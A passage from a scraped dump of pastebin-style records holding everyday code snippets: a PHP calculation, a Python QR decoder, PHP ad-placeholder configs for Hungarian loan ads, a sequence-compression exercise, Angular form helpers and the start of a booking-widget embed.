readline();\n\xa0\n$answers = $a + $b + $c;\n\xa0\n$hours = ceil($questions/$answers);\n$hours += floor($hours / 3);\nif($hours%4==0&&$hours>1){\n$hours--;\n}\necho ""Time needed: {$hours}h."";', date='2022-06-01 12:00:18 +00:00', hash_val='14c49b3a1caf29db3dc122f325610662', url='/zcntj0cc', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='bokunda', title='QR Code decoder', content='import time\n\xa0\nimport cv2\nimport numpy as np\nfrom pyzbar.pyzbar import decode\n\xa0\ndef current_milli_time():\n\xa0 \xa0 return round(time.time() * 1000)\n\xa0\ndef decoder():\n\xa0\n\xa0 \xa0 startTime = current_milli_time()\n\xa0 \xa0 #image = cv2.imread(\'D:\\\\testv3\\\\.processed\\\\12206331010100012966101\\\\pera.tiff\')\n\xa0 \xa0 image = cv2.imread(\'C:\\\\Users\\\\spokimica\\\\Documents\\\\12200130010100012086591_20212210000623711\\\\_P_1.jpg\')\n\xa0\n\xa0 \xa0 gray_img = cv2.cvtColor(image,0)\n\xa0 \xa0 barcode = decode(gray_img)\n\xa0\n\xa0 \xa0 for obj in barcode:\n\xa0 \xa0 \xa0 \xa0 points = obj.polygon\n\xa0 \xa0 \xa0 \xa0 (x,y,w,h) = obj.rect\n\xa0 \xa0 \xa0 \xa0 pts = np.array(points, np.int32)\n\xa0 \xa0 \xa0 \xa0 pts = pts.reshape((-1, 1, 2))\n\xa0 \xa0 \xa0 \xa0 cv2.polylines(image, [pts], True, (0, 255, 0), 3)\n\xa0\n\xa0 \xa0 \xa0 \xa0 barcodeData = obj.data.decode(""utf-8"")\n\xa0 \xa0 \xa0 \xa0 barcodeType = obj.type\n\xa0 \xa0 \xa0 \xa0 string = ""Data: "" + str(barcodeData) + "" | Type: "" + str(barcodeType)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 print(""Barcode: ""+barcodeData +"" | Type: ""+barcodeType)\n\xa0\n\xa0 \xa0 endTime = current_milli_time()\n\xa0\n\xa0 \xa0 processingTime = endTime - startTime\n\xa0 \xa0 print(""Processing time: "" + str(processingTime) + "" [ms]"")\n\xa0\ndecoder()', date='2022-06-01 11:56:44 +00:00', hash_val='b90b5c5eb9eb895851f0f23a2b6e16c1', url='/meip76d6', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='szotyi41', title='Untitled', content="<?php\n\xa0\n$example = [\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Babaváró',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => []\n\xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Személyi kölcsön',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => true,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_2' => [\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => true,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'headline_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 '_id' => 'abc124',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Vedd fel álmaid kölcsönét!',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Készpénzben!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'brand_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'asset',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 '_id' => 'abc123'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'path' => ''\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'cta_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Kalkulálj!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_name_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodName'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodImage'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 ]", date='2022-06-01 11:55:39 +00:00', hash_val='5d042ec2c74bc1c17328b696d76f7b0c', url='/SxuLkrXK', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Tss_Flmzy', title='Сжатие последовательности', content="input_file = open('input.txt')\n\xa0\nnums = list(map(int, input_file.readline().split())) + [-1]\n\xa0\nn = len(nums)\nk = 1\n\xa0\nfor i in range(1, n):\n\xa0\n\xa0 \xa0 if nums[i] - nums[i - 1] != 1:\n\xa0\n\xa0 \xa0 \xa0 \xa0 if k == 2:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 2], end=',')\n\xa0 \xa0 \xa0 \xa0 elif k > 2:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - k], end='-')\n\xa0 \xa0 \xa0 \xa0 if i != n - 1:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 1], end=',')\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 1], end='')\n\xa0 \xa0 \xa0 \xa0 k = 1\n\xa0\n\xa0 \xa0 else:\n\xa0\n\xa0 \xa0 \xa0 \xa0 k += 1", date='2022-06-01 11:54:04 +00:00', hash_val='32e4a8c11304839bfc25469c1c33d07f', url='/yyXjmkkd', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='attilan', title='Form utils', content="import { AbstractControl } from '@angular/forms';\n\xa0\ntype ControlChangeOptions = {\n\xa0 onlySelf?: boolean;\n\xa0 emitEvent?: boolean;\n};\n\xa0\nexport class FormUtils {\n\xa0\n\xa0 static readonly defaultOptions: ControlChangeOptions = {\n\xa0 \xa0 onlySelf: false,\n\xa0 \xa0 emitEvent: true,\n\xa0 };\n\xa0\n\xa0 /**\n\xa0 \xa0* Updates every value of given control array\n\xa0 \xa0*/\n\xa0 static patchControls<T>(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 value: T,\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.patchValue(value, options));\n\xa0 }\n\xa0\n\xa0 /**\n\xa0 \xa0* Disables each control in the array\n\xa0 \xa0*/\n\xa0 static disableControls(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.disable(options));\n\xa0 }\n\xa0\n\xa0 /**\n\xa0 \xa0* Enables each control in the array\n\xa0 \xa0*/\n\xa0 static enableControls(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 options = FormUtils.defaultOptions\n\xa0 ): void {\n\xa0 \xa0 if (!Array.isArray(controls)) {\n\xa0 \xa0 \xa0 return;\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 controls.forEach(control => control.enable(options));\n\xa0 }\n\xa0\n}", date='2022-06-01 11:50:09 +00:00', hash_val='1fc86e7636f3af26ed088c3b259c684f', url='/me0WmRP2', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='szotyi41', title='Untitled', content="<?php\n\xa0\n$example = [\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Személyi kölcsön',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_2' => [\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'headline_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Vedd fel álmaid kölcsönét!',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Készpénzben!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'cta_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Kalkulálj!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_name_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodName'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodImage'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 ]", date='2022-06-01 11:47:25 +00:00', hash_val='9e6144ecb91d47ec7988247132573c8c', url='/cGVcumWu', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='borlabs', title='SimplybookWidget', content='[borlabs-cookie id=""simplybook"" type=""content-blocker""]<script src=""https://widget.simplybook.it/v2/widget/widget.js""></script><script>\nwindow.BorlabsCookie.callWhenLoaded(""SimplybookWidget"", function () {\n\xa0 \xa0 var widget = new 